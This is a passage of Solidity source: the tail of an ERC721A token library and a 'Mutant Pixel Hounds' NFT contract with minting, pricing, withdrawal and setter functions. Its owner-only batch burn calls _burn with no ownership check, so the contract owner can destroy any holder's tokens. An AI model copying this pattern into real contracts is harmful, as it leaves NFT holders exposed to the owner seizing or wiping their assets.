1020                     if (ownership.addr != address(0)) {
1021                         return ownership;
1022                     }
1023                     // Invariant:
1024                     // There will always be an ownership that has an address and is not burned
1025                     // before an ownership that does not have an address and is not burned.
1026                     // Hence, curr will not underflow.
1027                     while (true) {
1028                         curr--;
1029                         ownership = _ownerships[curr];
1030                         if (ownership.addr != address(0)) {
1031                             return ownership;
1032                         }
1033                     }
1034                 }
1035             }
1036         }
1037         revert OwnerQueryForNonexistentToken();
1038     }
1039 
1040     /**
1041      * @dev See {IERC721-ownerOf}.
1042      */
1043     function ownerOf(uint256 tokenId) public view override returns (address) {
1044         return ownershipOf(tokenId).addr;
1045     }
1046 
1047     /**
1048      * @dev See {IERC721Metadata-name}.
1049      */
1050     function name() public view virtual override returns (string memory) {
1051         return _name;
1052     }
1053 
1054     /**
1055      * @dev See {IERC721Metadata-symbol}.
1056      */
1057     function symbol() public view virtual override returns (string memory) {
1058         return _symbol;
1059     }
1060 
1061     /**
1062      * @dev See {IERC721Metadata-tokenURI}.
1063      */
1064     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1065         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1066 
1067         string memory baseURI = _baseURI();
1068         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
1069     }
1070 
1071     /**
1072      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1073      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1074      * by default, can be overriden in child contracts.
1075      */
1076     function _baseURI() internal view virtual returns (string memory) {
1077         return '';
1078     }
1079 
1080     /**
1081      * @dev See {IERC721-approve}.
1082      */
1083     function approve(address to, uint256 tokenId) public override {
1084         address owner = ERC721A.ownerOf(tokenId);
1085         if (to == owner) revert ApprovalToCurrentOwner();
1086 
1087         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
1088             revert ApprovalCallerNotOwnerNorApproved();
1089         }
1090 
1091         _approve(to, tokenId, owner);
1092     }
1093 
1094     /**
1095      * @dev See {IERC721-getApproved}.
1096      */
1097     function getApproved(uint256 tokenId) public view override returns (address) {
1098         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1099 
1100         return _tokenApprovals[tokenId];
1101     }
1102 
1103     /**
1104      * @dev See {IERC721-setApprovalForAll}.
1105      */
1106     function setApprovalForAll(address operator, bool approved) public override {
1107         if (operator == _msgSender()) revert ApproveToCaller();
1108 
1109         _operatorApprovals[_msgSender()][operator] = approved;
1110         emit ApprovalForAll(_msgSender(), operator, approved);
1111     }
1112 
1113     /**
1114      * @dev See {IERC721-isApprovedForAll}.
1115      */
1116     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1117         return _operatorApprovals[owner][operator];
1118     }
1119 
1120     /**
1121      * @dev See {IERC721-transferFrom}.
1122      */
1123     function transferFrom(
1124         address from,
1125         address to,
1126         uint256 tokenId
1127     ) public override onlyAllowedOperator(from) {
1128         _transfer(from, to, tokenId);
1129     }
1130 
1131     /**
1132      * @dev See {IERC721-safeTransferFrom}.
1133      */
1134     function safeTransferFrom(
1135         address from,
1136         address to,
1137         uint256 tokenId
1138     ) public override onlyAllowedOperator(from) {
1139         safeTransferFrom(from, to, tokenId, '');
1140     }
1141 
1142     /**
1143      * @dev See {IERC721-safeTransferFrom}.
1144      */
1145     function safeTransferFrom(
1146         address from,
1147         address to,
1148         uint256 tokenId,
1149         bytes memory _data
1150     ) public override onlyAllowedOperator(from) {
1151         _transfer(from, to, tokenId);
1152         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1153             revert TransferToNonERC721ReceiverImplementer();
1154         }
1155     }
1156 
1157     /**
1158      * @dev Returns whether `tokenId` exists.
1159      *
1160      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1161      *
1162      * Tokens start existing when they are minted (`_mint`),
1163      */
1164     function _exists(uint256 tokenId) internal view returns (bool) {
1165         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1166             !_ownerships[tokenId].burned;
1167     }
1168 
1169     function _safeMint(address to, uint256 quantity) internal {
1170         _safeMint(to, quantity, '');
1171     }
1172 
1173     /**
1174      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1175      *
1176      * Requirements:
1177      *
1178      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1179      * - `quantity` must be greater than 0.
1180      *
1181      * Emits a {Transfer} event.
1182      */
1183     function _safeMint(
1184         address to,
1185         uint256 quantity,
1186         bytes memory _data
1187     ) internal {
1188         _mint(to, quantity, _data, true);
1189     }
1190 
1191     /**
1192      * @dev Mints `quantity` tokens and transfers them to `to`.
1193      *
1194      * Requirements:
1195      *
1196      * - `to` cannot be the zero address.
1197      * - `quantity` must be greater than 0.
1198      *
1199      * Emits a {Transfer} event.
1200      */
1201     function _mint(
1202         address to,
1203         uint256 quantity,
1204         bytes memory _data,
1205         bool safe
1206     ) internal {
1207         uint256 startTokenId = _currentIndex;
1208         if (to == address(0)) revert MintToZeroAddress();
1209         if (quantity == 0) revert MintZeroQuantity();
1210 
1211         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1212 
1213         // Overflows are incredibly unrealistic.
1214         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1215         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1216         unchecked {
1217             _addressData[to].balance += uint64(quantity);
1218             _addressData[to].numberMinted += uint64(quantity);
1219 
1220             _ownerships[startTokenId].addr = to;
1221             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1222 
1223             uint256 updatedIndex = startTokenId;
1224             uint256 end = updatedIndex + quantity;
1225 
1226             if (safe && to.isContract()) {
1227                 do {
1228                     emit Transfer(address(0), to, updatedIndex);
1229                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1230                         revert TransferToNonERC721ReceiverImplementer();
1231                     }
1232                 } while (updatedIndex != end);
1233                 // Reentrancy protection
1234                 if (_currentIndex != startTokenId) revert();
1235             } else {
1236                 do {
1237                     emit Transfer(address(0), to, updatedIndex++);
1238                 } while (updatedIndex != end);
1239             }
1240             _currentIndex = updatedIndex;
1241         }
1242         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1243     }
1244 
1245     /**
1246      * @dev Transfers `tokenId` from `from` to `to`.
1247      *
1248      * Requirements:
1249      *
1250      * - `to` cannot be the zero address.
1251      * - `tokenId` token must be owned by `from`.
1252      *
1253      * Emits a {Transfer} event.
1254      */
1255     function _transfer(
1256         address from,
1257         address to,
1258         uint256 tokenId
1259     ) private {
1260         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1261 
1262         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1263             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1264             getApproved(tokenId) == _msgSender());
1265 
1266         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1267         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1268         if (to == address(0)) revert TransferToZeroAddress();
1269 
1270         _beforeTokenTransfers(from, to, tokenId, 1);
1271 
1272         // Clear approvals from the previous owner
1273         _approve(address(0), tokenId, prevOwnership.addr);
1274 
1275         // Underflow of the sender's balance is impossible because we check for
1276         // ownership above and the recipient's balance can't realistically overflow.
1277         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1278         unchecked {
1279             _addressData[from].balance -= 1;
1280             _addressData[to].balance += 1;
1281 
1282             _ownerships[tokenId].addr = to;
1283             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1284 
1285             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1286             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1287             uint256 nextTokenId = tokenId + 1;
1288             if (_ownerships[nextTokenId].addr == address(0)) {
1289                 // This will suffice for checking _exists(nextTokenId),
1290                 // as a burned slot cannot contain the zero address.
1291                 if (nextTokenId < _currentIndex) {
1292                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1293                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1294                 }
1295             }
1296         }
1297 
1298         emit Transfer(from, to, tokenId);
1299         _afterTokenTransfers(from, to, tokenId, 1);
1300     }
1301 
1302     /**
1303      * @dev Destroys `tokenId`.
1304      * The approval is cleared when the token is burned.
1305      *
1306      * Requirements:
1307      *
1308      * - `tokenId` must exist.
1309      *
1310      * Emits a {Transfer} event.
1311      */
1312     function _burn(uint256 tokenId) internal virtual {
1313         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1314 
1315         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1316 
1317         // Clear approvals from the previous owner
1318         _approve(address(0), tokenId, prevOwnership.addr);
1319 
1320         // Underflow of the sender's balance is impossible because we check for
1321         // ownership above and the recipient's balance can't realistically overflow.
1322         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1323         unchecked {
1324             _addressData[prevOwnership.addr].balance -= 1;
1325             _addressData[prevOwnership.addr].numberBurned += 1;
1326 
1327             // Keep track of who burned the token, and the timestamp of burning.
1328             _ownerships[tokenId].addr = prevOwnership.addr;
1329             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1330             _ownerships[tokenId].burned = true;
1331 
1332             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1333             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1334             uint256 nextTokenId = tokenId + 1;
1335             if (_ownerships[nextTokenId].addr == address(0)) {
1336                 // This will suffice for checking _exists(nextTokenId),
1337                 // as a burned slot cannot contain the zero address.
1338                 if (nextTokenId < _currentIndex) {
1339                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1340                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1341                 }
1342             }
1343         }
1344 
1345         emit Transfer(prevOwnership.addr, address(0), tokenId);
1346         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1347 
1348         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1349         unchecked {
1350             _burnCounter++;
1351         }
1352     }
1353 
1354     /**
1355      * @dev Approve `to` to operate on `tokenId`
1356      *
1357      * Emits a {Approval} event.
1358      */
1359     function _approve(
1360         address to,
1361         uint256 tokenId,
1362         address owner
1363     ) private {
1364         _tokenApprovals[tokenId] = to;
1365         emit Approval(owner, to, tokenId);
1366     }
1367 
1368     /**
1369      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1370      *
1371      * @param from address representing the previous owner of the given token ID
1372      * @param to target address that will receive the tokens
1373      * @param tokenId uint256 ID of the token to be transferred
1374      * @param _data bytes optional data to send along with the call
1375      * @return bool whether the call correctly returned the expected magic value
1376      */
1377     function _checkContractOnERC721Received(
1378         address from,
1379         address to,
1380         uint256 tokenId,
1381         bytes memory _data
1382     ) private returns (bool) {
1383         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1384             return retval == IERC721Receiver(to).onERC721Received.selector;
1385         } catch (bytes memory reason) {
1386             if (reason.length == 0) {
1387                 revert TransferToNonERC721ReceiverImplementer();
1388             } else {
1389                 assembly {
1390                     revert(add(32, reason), mload(reason))
1391                 }
1392             }
1393         }
1394     }
1395 
1396     /**
1397      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1398      * And also called before burning one token.
1399      *
1400      * startTokenId - the first token id to be transferred
1401      * quantity - the amount to be transferred
1402      *
1403      * Calling conditions:
1404      *
1405      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1406      * transferred to `to`.
1407      * - When `from` is zero, `tokenId` will be minted for `to`.
1408      * - When `to` is zero, `tokenId` will be burned by `from`.
1409      * - `from` and `to` are never both zero.
1410      */
1411     function _beforeTokenTransfers(
1412         address from,
1413         address to,
1414         uint256 startTokenId,
1415         uint256 quantity
1416     ) internal virtual {}
1417 
1418     /**
1419      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1420      * minting.
1421      * And also called after one token has been burned.
1422      *
1423      * startTokenId - the first token id to be transferred
1424      * quantity - the amount to be transferred
1425      *
1426      * Calling conditions:
1427      *
1428      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1429      * transferred to `to`.
1430      * - When `from` is zero, `tokenId` has been minted for `to`.
1431      * - When `to` is zero, `tokenId` has been burned by `from`.
1432      * - `from` and `to` are never both zero.
1433      */
1434     function _afterTokenTransfers(
1435         address from,
1436         address to,
1437         uint256 startTokenId,
1438         uint256 quantity
1439     ) internal virtual {}
1440 }
1441 
1442 
1443 
1444 contract MutantPixelHounds is ERC721A, Owneable {
1445 
1446     string public baseURI = "ipfs://";
1447     string public contractURI = "ipfs://";
1448     string public baseExtension = ".json";
1449     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1450 
1451     uint256 public MAX_PER_TX_FREE = 3;
1452     uint256 public free_max_supply = 333;
1453     uint256 public constant MAX_PER_TX = 10;
1454     uint256 public max_supply = 5000;
1455     uint256 public price = 0.001 ether;
1456 
1457 
1458 
1459     bool public paused = true;
1460 
1461     constructor() ERC721A("Mutant Pixel Hounds", "MpxH") {}
1462 
1463     function PublicMint(uint256 _amount) external payable {
1464 
1465         address _caller = _msgSender();
1466         require(!paused, "Paused");
1467         require(max_supply >= totalSupply() + _amount, "All Gone");
1468         require(_amount > 0, "No 0 mints");
1469         require(tx.origin == _caller, "No Contract minting.");
1470         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1471         
1472       if(free_max_supply >= totalSupply()){
1473             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1474         }else{
1475             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1476             require(_amount * price == msg.value, "Invalid funds provided");
1477         }
1478 
1479 
1480         _safeMint(_caller, _amount);
1481     }
1482 
1483 
1484 
1485     function isApprovedForAll(address owner, address operator)
1486         override
1487         public
1488         view
1489         returns (bool)
1490     {
1491         // Whitelist OpenSea proxy contract for easy trading.
1492         
1493         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1494         if (address(proxyRegistry.proxies(owner)) == operator) {
1495             return true;
1496         }
1497 
1498         return super.isApprovedForAll(owner, operator);
1499     }
1500 
1501     function Withdraw() external onlyOwner {
1502         uint256 balance = address(this).balance;
1503         (bool success, ) = _msgSender().call{value: balance}("");
1504         require(success, "Failed to send");
1505     }
1506 
1507     function TeamMint(uint256 quantity) external onlyOwner {
1508         _safeMint(_msgSender(), quantity);
1509     }
1510 
1511 
1512     function pause(bool _state) external onlyOwner {
1513         paused = _state;
1514     }
1515 
1516     function setBaseURI(string memory baseURI_) external onlyOwner {
1517         baseURI = baseURI_;
1518     }
1519 
1520     function setContractURI(string memory _contractURI) external onlyOwner {
1521         contractURI = _contractURI;
1522     }
1523 
1524     function configPrice(uint256 newPrice) public onlyOwner {
1525         price = newPrice;
1526     }
1527 
1528 
1529      function configMAX_PER_TX_FREE(uint256 newFREE) public onlyOwner {
1530         MAX_PER_TX_FREE = newFREE;
1531     }
1532 
1533     function configmax_supply(uint256 newSupply) public onlyOwner {
1534         max_supply = newSupply;
1535     }
1536 
1537     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1538         free_max_supply = newFreesupply;
1539     }
1540     function newbaseExtension(string memory newex) public onlyOwner {
1541         baseExtension = newex;
1542     }
1543 
1544 
1545 //Future Use
1546         function burn(uint256[] memory tokenids) external onlyOwner {
1547         uint256 len = tokenids.length;
1548         for (uint256 i; i < len; i++) {
1549             uint256 tokenid = tokenids[i];
1550             _burn(tokenid);
1551         }
1552     }
1553 
1554 
1555     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1556         require(_exists(_tokenId), "Token does not exist.");
1557         return bytes(baseURI).length > 0 ? string(
1558             abi.encodePacked(
1559               baseURI,
1560               Strings.toString(_tokenId),
1561               baseExtension
1562             )
1563         ) : "";
1564     }
1565 }
1566 
1567 contract OwnableDelegateProxy { }
1568 contract ProxyRegistry {
1569     mapping(address => OwnableDelegateProxy) public proxies;
1570 }